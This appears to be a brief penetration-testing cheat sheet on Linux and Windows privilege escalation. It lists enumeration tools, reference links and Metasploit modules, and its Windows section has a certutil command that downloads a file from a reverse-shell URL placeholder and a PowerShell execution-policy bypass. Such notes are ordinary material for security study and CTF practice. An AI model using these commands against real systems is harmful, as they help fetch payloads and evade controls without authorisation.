<center><h1>Linux</h1></center>

### Tools
- LinEnum.sh
- linuxprivchecker.py

### Resources
- https://gtfobins.github.io/ [GTFO Bins]
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

----
<center><h1>Windows</h1></center>

### Snippets
__wget for windows ->__ `> certutil -urlcache -f <reverse_shell-url> <file-name>`
__Bypass powershell execution policy ->__ `> powershell.exe -exec bypass -Command "<command>"`

### Resources
- http://www.fuzzysecurity.com/tutorials/16.html [For CTFs]
- https://github.com/rasta-mouse/Sherlock [Vulnerability Finder | powershell script]
- https://github.com/AonCyberLabs/Windows-Exploit-Suggester [Exploit suggester]

----
### Reverse Shells
Bash -> `# bash -i`

---
### Generic Tools
- post/multi/recon/local_exploit_suggester [metasploit module]
- https://netsec.ws [msfvenom payloads | spawning TTY]
-----
<center><h1>To-Do</h1></center>

###### Look for command history [powershell | command prompt | bash etc]